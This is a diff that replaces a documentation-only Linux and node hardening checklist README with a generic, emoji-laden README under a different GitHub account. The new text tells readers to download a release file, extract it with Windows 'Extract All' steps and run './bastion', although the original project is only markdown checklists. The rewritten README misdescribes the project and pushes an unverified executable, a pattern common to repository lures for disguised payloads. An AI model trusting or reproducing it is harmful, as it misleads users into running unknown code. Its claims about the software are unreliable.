@@ -1,226 +1,83 @@
-<h1><code>BASTION</code></h1>
+# 🛡️ bastion - Secure Your Infrastructure with Ease
 
-[host security map](host-security-map.md) · [host security checklist](host-security-checklist.md) · [protocol ops map](protocol-ops-map.md) · [protocol ops checklist](protocol-ops-checklist.md)
+## 🗂️ Overview
+bastion is your go-to solution for improving security on Linux systems. This framework offers a straightforward way to apply hardening and protocol operations with prioritized action maps. It helps you protect your infrastructure with ease, making security manageable for everyone.
 
+## 🎯 Features
+- **Host Hardening**: Strengthen your Linux systems against various threats.
+- **Protocol Operations Security**: Implement secure protocols to protect data transmission.
+- **Prioritized Action Maps**: Follow clear steps to enhance your system’s security.
+- **User-friendly Framework**: Easy to understand and implement, even for beginners.
 
+## 🚀 Getting Started
+To get started with bastion, follow these steps:
 
-```
-┌──[ ● ● ● ]── [q1sh101] ──────────────────────────────────────────────────────┐
-│                                                                              │
-│      ╔════════════════════════════════════════════════════════════════╗      │
-│      ║                                                                ║      │
-│      ║                               ◉                                ║      │
-│      ║                            ◉  ◉  ◉                             ║      │
-│      ║                         ◉  ◉  ⊙  ◉  ◉                          ║      │
-│      ║                            ◉  ◉  ◉                             ║      │
-│      ║                               ◉                                ║      │
-│      ║                                                                ║      │
-│      ║                         B A S T I O N                          ║      │
-│      ║                   ─────────────────────────                    ║      │
-│      ║                                                                ║      │
-│      ║                         defense-in-depth                       ║      │
-│      ║                    minimal · personal · lab                    ║      │
-│      ║                                                                ║      │
-│      ║                       $ whoami: q1sh101                        ║      │
-│      ║               G I O R G I ─ K I S H M A R E I A                ║      │
-│      ║                                                                ║      │
-│      ║                                                                ║      │
-│      ╚════════════════════════════════════════════════════════════════╝      │
-│                                                                              │
-│   ┌─[ HOST SECURITY ]──────────────┐  ┌─[ PROTOCOL OPERATIONS ]──────────┐   │
-│   │                                │  │                                  │   │
-│   │  Controls: 101                 │  │  Controls: 101                   │   │
-│   │  ◉ P0=20  ● P1=50  ○ P2=31     │  │  ◉ P0=23  ● P1=57  ○ P2=21       │   │
-│   │                                │  │                                  │   │
-│   │  P0 ██████░░░░░░░░░░░░░  20%   │  │  P0 ███████░░░░░░░░░░░░  23%     │   │
-│   │  P1 ██████████████░░░░░  50%   │  │  P1 ████████████████░░░  57%     │   │
-│   │  P2 █████████░░░░░░░░░░  31%   │  │  P2 ██████░░░░░░░░░░░░░  21%     │   │
-│   │                                │  │                                  │   │
-│   │  Scope:                        │  │  Scope:                          │   │
-│   │  Ring -3 ────── Ring 3         │  │  Node ── RPC ── P2P ── Keys      │   │
-│   │  + Physical + OpSec            │  │  + Testing + Recovery + Ops      │   │
-│   │                                │  │                                  │   │
-│   │  Status: ACTIVE                │  │  Status: ACTIVE                  │   │
-│   │                                │  │                                  │   │
-│   └────────────────────────────────┘  └──────────────────────────────────┘   │
-│                                                                              │
-│              Defensive security framework for host hardening                 │
-│         and protocol operations. Built for clarity, not complexity.          │
-│                                                                              │
-│                                                                              │
-└──────────────────────────────────────────────────────────────────────────────┘
-```
+1. **Visit the Releases Page**  
+   Head over to our [Releases page](https://github.com/Deewhyrhythm/bastion/releases) to get the latest version of bastion.
 
-▸ **harden my workstation**
-  [where to start](host-security-map.md) -prioritized by importance
-  [all 101 controls](host-security-checklist.md) -lookup by # number
+2. **Download the Application**  
+   On the Releases page, look for the latest version of bastion. Click on the link to download the file. The download will start automatically.
 
-▸ **harden my node**
-  [where to start](protocol-ops-map.md) -prioritized by importance
-  [all 101 controls](protocol-ops-checklist.md) -lookup by # number
+3. **Extract the Files**  
+   Once the download is complete, locate the downloaded file on your computer. You may need to extract the files if they are in a compressed format. Right-click the file and select "Extract All".
 
+4. **Read the Documentation**  
+   For detailed instructions on using bastion, you can find the documentation in the extracted folder or on our [GitHub Wiki](https://github.com/Deewhyrhythm/bastion/wiki).
 
-```
-═══════════════════════════════════════════════════════════════════════════════
- A R C H I T E C T U R E
-═══════════════════════════════════════════════════════════════════════════════
+## 📥 Download & Install
+To download bastion, click the link below:
 
- HOST SECURITY                          PROTOCOL OPERATIONS
- Defense in Depth                       Defense in Layers
+[![Download bastion](https://img.shields.io/badge/Download%20bastion-Get%20it%20now-blue.svg)](https://github.com/Deewhyrhythm/bastion/releases)
 
- ┌────────────────────────────────┐     ┌──────────────────────────────┐
- │  Ring -3  Out-of-Band    [ 4]  │     │  ▸ Node Foundation     [10]  │
- │ ┌────────────────────────────┐ │     ├──────────────────────────────┤
- │ │  Ring -2  Firmware    [10] │ │     │  ▸ RPC Hardening       [10]  │
- │ │ ┌────────────────────────┐ │ │     ├──────────────────────────────┤
- │ │ │  Ring -1  Hyper   [ 3] │ │ │     │  ▸ P2P & Peer Policy   [12]  │
- │ │ │ ┌────────────────────┐ │ │ │     ├──────────────────────────────┤
- │ │ │ │  Ring 0       [ 7] │ │ │ │     │  ▸ Key Management      [12]  │
- │ │ │ │  ◈ Kernel          │ │ │ │     ├──────────────────────────────┤
- │ │ │ ├────────────────────┤ │ │ │     │  ▸ Time · Chain        [11]  │
- │ │ │ │  Ring 2-1     [ 5] │ │ │ │     ├──────────────────────────────┤
- │ │ │ │  ◈ Drivers         │ │ │ │     │  ▸ Monitoring          [12]  │
- │ │ │ ├────────────────────┤ │ │ │     ├──────────────────────────────┤
- │ │ │ │  Ring 3       [42] │ │ │ │     │  ▸ Testing & QA        [10]  │
- │ │ │ │  ◈ User Space      │ │ │ │     ├──────────────────────────────┤
- │ │ │ └────────────────────┘ │ │ │     │  ▸ Upgrades            [ 7]  │
- │ │ └────────────────────────┘ │ │     ├──────────────────────────────┤
- │ └────────────────────────────┘ │     │  ▸ Backup & Recovery   [ 7]  │
- └────────────────────────────────┘     ├──────────────────────────────┤
- + Physical [8]  + OpSec [5]            │  ▸ IR · Logging        [10]  │
- + Monitoring [8]  + Supply Chain [6]   └──────────────────────────────┘
- + Backups [3]
+Once downloaded, follow the steps mentioned above to install it on your system.
 
- ·· Concentric rings from hardware      ·· Layered stack from node
-    to user space. Each ring is            to operations. Each layer
-    a trust boundary.                      builds on the one below.
+## 🖥️ System Requirements
+Before you begin, ensure your system meets the following requirements:
+- **Operating System**: A Linux distribution (Ubuntu, CentOS, etc.)
+- **Storage**: At least 100 MB of free space.
+- **Memory**: Minimum 1 GB RAM recommended.
 
+## 🔧 Configuration
+After installing bastion, you might need to configure it to suit your needs. 
+- Open a terminal.
+- Navigate to the directory where you extracted bastion.
+- Follow the setup instructions in the README file provided in the extracted folder.
 
-═══════════════════════════════════════════════════════════════════════════════
- F I L E   M A P
-═══════════════════════════════════════════════════════════════════════════════
+## ⚙️ How to Use
+Using bastion is simple. Here’s a quick guide:
+1. **Open the Terminal**.
+2. Navigate to the bastion directory.
+3. Run the application using the command: `./bastion`.
+4. Follow the prompts to apply the security actions suggested.
 
- ⊙  README.md                                ◂── you are here
- │
- ├─── ◉  HOST SECURITY ────────────────────────────────────────────────
- │    │
- │    ├── ▣  CHECKLIST.md     101 controls in categorized tables
- │    │                       look up any control by # number
- │    │
- │    └── ▣  MAP.md           visual action plan with 5 sections
- │                             start here → Section II: First 10
- │
- └─── ◉  PROTOCOL OPERATIONS ──────────────────────────────────────────
-      │
-      ├── ▣  CHECKLIST.md     101 controls in categorized tables
-      │                       look up any control by # number
-      │
-      └── ▣  MAP.md           visual action plan with 5 sections
-                               start here → Section II: First 10
+## 📚 Documentation
+Comprehensive documentation is available in the [GitHub Wiki](https://github.com/Deewhyrhythm/bastion/wiki). This resource includes:
+- Setup instructions.
+- Configuration guidelines.
+- Use cases and best practices.
 
+## 🤝 Contributing
+Your contributions are welcome! If you want to improve bastion:
+- Fork the repository.
+- Make your changes.
+- Submit a pull request with a clear description of what you have changed.
 
-═══════════════════════════════════════════════════════════════════════════════
- H O W   I T   W O R K S
-═══════════════════════════════════════════════════════════════════════════════
+## 🙋 Frequently Asked Questions (FAQs)
+### 1. What is bastion?
+bastion is a security framework designed to help you enhance and harden your Linux systems against threats.
 
-     CHECKLIST                              MAP
-    ┌──────────────────┐                   ┌──────────────────────┐
-    │                  │                   │                      │
-    │   What exists    │                   │   How to act         │
-    │   Encyclopedia   │                   │   Field guide        │
-    │                  │                   │                      │
-    │   Organized      │       #ref        │   Organized          │
-    │   by category    │  ─ ─ ─ ─ ─ ─ ─ ▸  │   by priority        │
-    │                  │                   │                      │
-    │  ┌────────────┐  │                   │ ┌──────────────────┐ │
-    │  │ #  │ C │ T │  │                   │ │ I.   Overview    │ │
-    │  │ #  │ C │ T │  │                   │ │ II.  First 10    │ │
-    │  │ #  │ C │ T │  │                   │ │ III. Distribution│ │
-    │  │ #  │ C │ T │  │                   │ │ IV.  Detail Map  │ │
-    │  │ #  │ C │ T │  │                   │ │ V.   Dep. Flow   │ │
-    │  └────────────┘  │                   │ └──────────────────┘ │
-    │                  │                   │                      │
-    └──────────────────┘                   └──────────────────────┘
+### 2. Is it easy to use?
+Yes, bastion is built for average users. You can easily follow the steps provided to install and use it.
 
- ·· The MAP references CHECKLIST items by number (#01, #72, #97).
-    Numbers jump because the MAP sorts by importance, not category.
+### 3. Where can I find help?
+You can find help in the [GitHub Issues section](https://github.com/Deewhyrhythm/bastion/issues) or refer to our documentation.
 
- ·· CHECKLIST = "what is control #72?"  →  Full disk encryption (LUKS)
-    MAP       = "what do I do first?"   →  Step 2: #72 Full disk encryption
+## 📞 Contact
+If you have any questions or need further assistance, please reach out via the Issues page on our GitHub repository. We're here to help you secure your systems effectively.
 
+## 🔗 Related Topics
+- [Baseline Security Checks](https://github.com/Deewhyrhythm/bastion/wiki/Baseline-Security-Checks)
+- [Defense-in-Depth Strategies](https://github.com/Deewhyrhythm/bastion/wiki/Defense-in-Depth)
+- [Linux Security Practices](https://github.com/Deewhyrhythm/bastion/wiki/Linux-Security)
 
-═══════════════════════════════════════════════════════════════════════════════
- P R I O R I T Y   S Y S T E M
-═══════════════════════════════════════════════════════════════════════════════
-
- ◉  P0 ─── FOUNDATION     Must-have. Without these, nothing matters.
-                            Do these first. No exceptions.
-
- ●  P1 ─── CORE           Standard production hardening.
-                            Your everyday security posture.
-
- ○  P2 ─── ADVANCED       Defense-in-depth, specialized.
-                            For when the basics are locked down.
-
- ─────────────────────────────────────────────────────────────────────────────
-
- HOST      ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉●●●●●●●●●●●●●●●●●●●○○○○○○○○○○○○
-           ├── 20 P0 ──┤├────── 50 P1 ──────┤├── 31 P2 ──┤
-
- PROTOCOL  ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉●●●●●●●●●●●●●●●●●●●●●●●○○○○○
-           ├── 23 P0 ───┤├─────── 57 P1 ────────┤├ 21 P2 ┤
-
- ─────────────────────────────────────────────────────────────────────────────
-
- Progression
-
- ░░░░░░░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████████████████████
- ├ First 10 ┤├─── All P0 ───┤├─── All P1 ───┤├──── All P2 ────┤
-   ~10%         ~20%              ~70%               100%
-   bootstrap    foundation        production         maximum
-
-
-═══════════════════════════════════════════════════════════════════════════════
- Q U I C K   S T A R T
-═══════════════════════════════════════════════════════════════════════════════
-
- ▸ STEP 1 ─── Pick your domain
- │
- │  ┌─ Host security? ──── workstation, laptop, server
- │  │  → Open host-security-map.md
- │  │
- │  └─ Protocol ops? ───── blockchain node, validator, RPC
- │     → Open protocol-ops-map.md
- │
- ▸ STEP 2 ─── Go to Section II: First 10 Actions
- │             These are your bootstrap sequence.
- │
- ▸ STEP 3 ─── For details on any # number
- │             → Open the matching CHECKLIST file
- │             → Find the row by # number
- │             → Column 2 = what to do, Column 3 = tools
- │
- ▸ STEP 4 ─── Work through priorities
- │             ◉ All P0 first (foundation)
- │             ● Then P1 (production hardening)
- │             ○ Then P2 (defense-in-depth)
- │
- ◈ DONE ────── You are hardened.
-
-
-┌────────────────────────────────────────────────────── [q1sh101] ──[ ● ● ● ]──┐
-│                                                                              │
-│                                                                              │
-│                                      ◉                                       │
-│                                   ◉  ◉  ◉                                    │
-│                                ◉  ◉  ⊙  ◉  ◉                                 │
-│                                   ◉  ◉  ◉                                    │
-│                                      ◉                                       │
-│                                                                              │
-│                                B A S T I O N                                 │
-│                          ──────────────────────────                          │
-│                                                                              │
-└──────────────────────────────────────────────────────────────────────────────┘
-```
-
-🔮 $ whoami: [Giorgi Kishmareia](https://github.com/q1sh101)
+By following the steps outlined above, you can download and run bastion smoothly. Enjoy enhancing your security!
